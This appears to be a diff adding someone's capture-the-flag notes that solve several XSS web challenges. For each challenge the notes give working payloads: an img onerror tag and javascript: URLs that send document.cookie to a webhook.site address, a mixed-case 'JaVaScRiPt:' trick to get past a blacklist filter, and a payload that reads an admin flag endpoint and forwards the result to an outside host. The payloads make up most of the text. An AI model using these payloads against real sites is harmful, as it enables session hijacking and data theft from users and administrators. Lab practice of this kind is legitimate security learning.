@@ -1,0 +1,21 @@
+Recipe Box: 
+	If we attempt xss on the first search bar it works but cannot find any document.cookie, because we are not admin. 
+	Instead, if we put the link of the page after attempting the xss in search bar in the second URL bar, the admin bot will execute it and it will work.
+	We need to write in the search bar: <img src="x" onerror="fetch('https://webhook.site/fac7d8bf-3b6a-45ca-a4c6-eb4ec49a3638/?c=' + encodeURIComponent(document.cookie))">, with the webhook site so tthat we can read the fetch.
+
+
+scratchPad: 
+	When a browser sees a URL that starts with javascript: instead of http://, it behaves completely differently: It does not navigate to a new page. Instead, it treats the rest of the URL as a script and executes it immediately inside the current page. We can put this into the URL bar and it works: javascript:fetch('https://webhook.site/fac7d8bf-3b6a-45ca-a4c6-eb4ec49a3638/?c=' + encodeURIComponent(document.cookie));
+
+
+GuestBook:
+	Same solve as before, I just need wo substitute with JaVaScRiPt:fetch('https://webhook.site/fac7d8bf-3b6a-45ca-a4c6-eb4ec49a3638/?c=' + encodeURIComponent(document.cookie)); because the page sanitized for javascript.
+	It sanitizes with blacklists, so vulnerable to variations, like Javascript.
+
+
+PicShare:
+	URL doesn't block javascript:fetch('/admin/api/flag', {method:'GET'}).then(r => r.text()).then(data => {fetch('https://webhook/?d=' + encodeURIcomponent(data))})
+
+
+PidgeonPost: 
+	Sempre accetta javascript:etc. identico a scratchpad
